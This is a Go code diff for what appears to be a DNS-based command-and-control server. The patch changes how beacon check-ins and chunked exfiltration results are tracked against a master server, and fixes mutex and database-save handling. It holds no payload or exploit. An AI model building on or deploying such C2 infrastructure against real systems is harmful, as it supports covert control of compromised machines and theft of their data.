@@ -1044,7 +1044,41 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate 
 
 				if hasExpectation && time.Since(expected.ReceivedAt) < 2*time.Minute {
 					// Still actively receiving chunks - DO NOT re-send or clear
+					// But check Master to see if task was completed (reassembly finished)
 					c2.mutex.Unlock()
+
+					if masterClient != nil {
+						// Get master task ID if we have a mapping
+						c2.mutex.RLock()
+						masterTaskID, hasMasterID := c2.masterTaskIDs[task.ID]
+						c2.mutex.RUnlock()
+
+						checkTaskID := task.ID
+						if hasMasterID {
+							checkTaskID = masterTaskID
+						}
+
+						// Quick check if Master completed the task
+						if masterStatus, err := masterClient.GetTaskStatus(checkTaskID); err == nil {
+							if masterStatus == "completed" || masterStatus == "failed" || masterStatus == "partial" {
+								// Task completed on Master - update local status and clear
+								c2.mutex.Lock()
+								if storedTask, exists := c2.tasks[task.ID]; exists {
+									storedTask.Status = masterStatus
+								}
+								beacon.CurrentTask = ""
+								delete(c2.expectedResults, task.ID)
+								c2.mutex.Unlock()
+
+								if c2.debug && !isDuplicate {
+									logf("[DEBUG] Task %s completed on Master (status: %s), cleared from beacon %s during exfiltration check", task.ID, masterStatus, beaconID)
+								}
+								return "ACK"
+							}
+						}
+					}
+
+					// Still exfiltrating - don't give new task
 					if c2.debug && !isDuplicate {
 						logf("[DEBUG] Beacon %s is actively exfiltrating task %s, returning ACK", beaconID, task.ID)
 					}
@@ -1401,7 +1435,6 @@ func (c2 *C2Manager) handleResult(parts []string, isDuplicate bool) string {
 			}
 		}
 	} else {
-		c2.mutex.Unlock()
 		if c2.debug && !isDuplicate {
 			logf("[DEBUG] Task %s not found in memory (completed on another DNS server), forwarding to Master", taskID)
 		}
@@ -1411,8 +1444,8 @@ func (c2 *C2Manager) handleResult(parts []string, isDuplicate bool) string {
 	}
 	c2.mutex.Unlock()
 
-	// Save result to database (async) - skip for duplicates
-	if c2.db != nil && !isDuplicate {
+	// Save result to database (async) - skip for duplicates and tasks not in memory
+	if c2.db != nil && !isDuplicate && exists {
 		go func(tid, bid, res string) {
 			if err := c2.db.SaveTaskResult(tid, bid, res, 1, 1); err != nil && c2.debug {
 				logf("[C2] Failed to save task result to database: %v", err)
